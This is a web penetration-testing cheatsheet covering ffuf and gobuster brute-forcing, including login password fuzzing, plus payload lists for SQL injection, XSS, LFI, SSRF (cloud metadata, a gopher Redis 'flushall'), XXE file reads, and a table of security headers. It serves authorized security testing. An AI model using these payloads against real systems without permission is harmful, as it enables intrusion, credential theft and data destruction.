+++
title = "Web Recon & Testing"
date = 2026-05-31T00:00:00-04:00
draft = false
description = "Directory brute-forcing with ffuf and gobuster, OWASP test payloads for SQLi/XSS/LFI/SSRF, and security-relevant HTTP headers."
tags = ["web", "recon", "owasp", "ffuf", "gobuster", "security-headers"]
categories = ["cheatsheets"]
+++

## Directory & File Brute-Forcing

### ffuf

```bash
# Directory enumeration
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Filter by status code (exclude 404s)
ffuf -u https://target.com/FUZZ -w wordlist.txt -fc 404

# Filter by response size
ffuf -u https://target.com/FUZZ -w wordlist.txt -fs 1234

# Extension fuzzing
ffuf -u https://target.com/FUZZ -w wordlist.txt -e .php,.bak,.old,.txt

# Subdomain enumeration
ffuf -u https://FUZZ.target.com -w subdomains.txt -H "Host: FUZZ.target.com"

# POST parameter fuzzing
ffuf -u https://target.com/login -X POST \
     -d "username=admin&password=FUZZ" \
     -w passwords.txt \
     -H "Content-Type: application/x-www-form-urlencoded"

# JSON body fuzzing
ffuf -u https://api.target.com/login -X POST \
     -d '{"username":"FUZZ","password":"admin"}' \
     -w usernames.txt \
     -H "Content-Type: application/json"

# Output
ffuf -u https://target.com/FUZZ -w wordlist.txt -o results.json -of json
```

### gobuster

```bash
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u https://target.com -w wordlist.txt -x php,html,txt
gobuster dir -u https://target.com -w wordlist.txt -k              # skip TLS verify
gobuster dir -u https://target.com -w wordlist.txt -t 50           # 50 threads
gobuster dir -u https://target.com -w wordlist.txt -b 404,403      # blacklist codes

# DNS mode — subdomain enumeration
gobuster dns -d target.com -w subdomains.txt

# Virtual host enumeration
gobuster vhost -u https://target.com -w subdomains.txt
```

---

## OWASP Test Payloads

> These are for use in **authorized** testing environments only.

### SQL Injection

```sql
-- Basic detection
'
''
' OR '1'='1
' OR 1=1--
' OR 1=1#
admin'--
1' ORDER BY 1--
1' ORDER BY 2--   -- increment until error to count columns

-- UNION-based (after column count confirmed)
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT username,password FROM users--

-- Boolean-based blind
' AND 1=1--     -- true
' AND 1=2--     -- false (different response = injectable)

-- Time-based blind (MySQL)
' AND SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--   -- MSSQL
```

### Cross-Site Scripting (XSS)

```html
<!-- Basic detection -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>

<!-- Attribute context -->
" onmouseover="alert(1)
' autofocus onfocus='alert(1)

<!-- Script context (inside existing JS) -->
';alert(1)//
\';alert(1)//

<!-- Polyglot -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e
```

### Local File Inclusion (LFI)

```
/etc/passwd
../../../etc/passwd
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd   (URL encoded)
/proc/self/environ
/proc/self/cmdline
/var/log/apache2/access.log                 (log poisoning target)
```

### Server-Side Request Forgery (SSRF)

```
http://127.0.0.1/
http://localhost/
http://169.254.169.254/                     (AWS metadata)
http://169.254.169.254/latest/meta-data/
http://[::1]/                               (IPv6 localhost)
http://0.0.0.0/
file:///etc/passwd
dict://127.0.0.1:22/                        (port probe)
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall  (Redis)
```

### XXE (XML External Entity)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

---

## Security-Relevant HTTP Headers

### Headers to Check on Target

```bash
# Fetch and inspect security headers
curl -sI https://target.com | grep -iE "(strict|content-security|x-frame|x-content|referrer|permissions|access-control)"
```

| Header | Secure Value | Risk if Missing |
|--------|-------------|-----------------|
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | Allows HTTP downgrade |
| `Content-Security-Policy` | Restrictive policy | XSS, data injection |
| `X-Frame-Options` | `DENY` or `SAMEORIGIN` | Clickjacking |
| `X-Content-Type-Options` | `nosniff` | MIME-type sniffing |
| `Referrer-Policy` | `no-referrer` or `same-origin` | Leaks URL to third parties |
| `Permissions-Policy` | Restrictive (disable camera, mic) | Feature abuse |
| `Access-Control-Allow-Origin` | Specific origin, not `*` for credentialed | CORS bypass |

### Cookie Security Flags

```
Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict
```

| Flag | Purpose |
|------|---------|
| `HttpOnly` | Prevents JS access — mitigates XSS session theft |
| `Secure` | Transmit over HTTPS only |
| `SameSite=Strict` | Blocks cross-site request sending |
| `SameSite=Lax` | Allows top-level navigation GETs |

---

## Wordlist Locations

```bash
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirb/big.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt
/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt
```
